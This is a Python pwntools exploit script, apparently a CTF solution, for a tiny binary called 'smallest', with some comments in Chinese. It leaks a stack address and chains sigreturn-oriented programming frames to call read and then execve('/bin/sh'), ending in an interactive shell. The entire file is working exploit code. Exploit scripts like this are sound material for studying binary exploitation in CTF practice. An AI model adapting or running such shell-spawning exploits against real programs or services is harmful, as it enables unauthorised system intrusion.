#coding=utf8
from pwn import *
from LibcSearcher import *
small = ELF('./smallest')
# if args['REMOTE']:
#     sh = remote('127.0.0.1', 7777)
# else:
sh = process('./smallest')
context.arch = 'amd64'
context.log_level = 'debug'
syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0
## set start addr three times

payload = p64(start_addr) * 3
# gdb.attach(sh)
sh.send(payload)

## modify the return addr to start_addr+3
## so that skip the xor rax,rax; then the rax=1
## get stack addr

# gdb.attach(sh)
sh.send('\xb3')

stack_addr = u64(sh.recv()[8:16])
print "stack_addr = " + hex(stack_addr)
log.success('leak stack addr :' + hex(stack_addr))


## make the rsp point to stack_addr
## the frame is read(0,stack_addr,0x400)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
print "constants.SYS_read = " + hex(sigframe.rax)
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

payload = p64(start_addr) + 'a' * 8 + str(sigframe)

# gdb.attach(sh)
sh.send(payload)

## set rax=15 and call sigreturn
sigreturn = p64(syscall_ret) + 'A' * 7  # 覆盖上面的 'a'*8

# gdb.attach(sh)
sh.send(sigreturn)

## call execv("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
print len(frame_payload)
payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'

# gdb.attach(sh)
sh.send(payload)

# gdb.attach(sh)
sh.send(sigreturn)

sh.interactive()